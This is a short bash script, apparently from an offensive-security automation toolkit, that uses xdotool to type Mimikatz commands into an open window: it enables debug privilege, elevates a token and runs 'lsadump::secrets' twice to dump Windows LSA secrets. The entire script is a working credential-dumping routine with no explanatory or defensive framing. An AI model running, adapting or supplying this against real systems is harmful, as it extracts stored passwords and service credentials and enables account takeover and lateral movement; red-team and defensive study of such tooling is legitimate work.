#!/bin/bash

: '
Mimikatz: Dump lsa secrets.
'

paste_command "privilege::debug"
xdotool key Return
sleep 1

paste_command "lsadump::secrets"
xdotool key Return
sleep 1

paste_command "token::elevate"
xdotool key Return
sleep 1

paste_command "lsadump::secrets"
xdotool key Return
sleep 1
